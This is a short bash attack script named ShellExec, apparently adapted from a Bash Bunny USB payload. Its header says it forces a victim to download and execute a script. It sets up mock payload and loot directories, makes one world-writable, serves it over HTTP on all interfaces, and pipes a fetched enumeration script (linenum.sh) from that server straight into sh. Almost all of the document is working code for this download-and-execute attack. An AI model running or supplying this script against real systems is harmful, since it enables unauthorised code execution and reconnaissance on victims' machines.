#!/bin/bash

# Title:     ShellExec
# Author:    audibleblink
# Target:    Mac/Linux
# Version:   1.1
#
# Create a web server on the BashBunny and force
# the victim to download and execute a script.
# Perfect for when mass storage isn't an option.
#
# White            |  Ready
# Ammber blinking  |  Waiting for server
# Blue blinking    |  Attacking
# Green            |  Finished


# Create fake Bash Bunny USB drive directory
MOCK_BASH_BUNNY_USB_DIR=$HOME/bash_bunny
PAYLOAD_DIR=$MOCK_BASH_BUNNY_USB_DIR/payloads/ShellExec
LOOT_DIR=$MOCK_BASH_BUNNY_USB_DIR/loot/ShellExec
LOOT_FILE=$LOOT_DIR/loot.txt
mkdir -p $MOCK_BASH_BUNNY_USB_DIR $PAYLOAD_DIR $LOOT_DIR

chmod 777 $PAYLOAD_DIR

# Create http server to host payloads
python3 -m http.server 8080 --directory $PAYLOAD_DIR --bind 0.0.0.0 &

# wait until port is listening
while ! nc -z localhost 8080; do sleep 0.2; done

curl --noproxy '*' "http://localhost:8080/linenum.sh" | sh
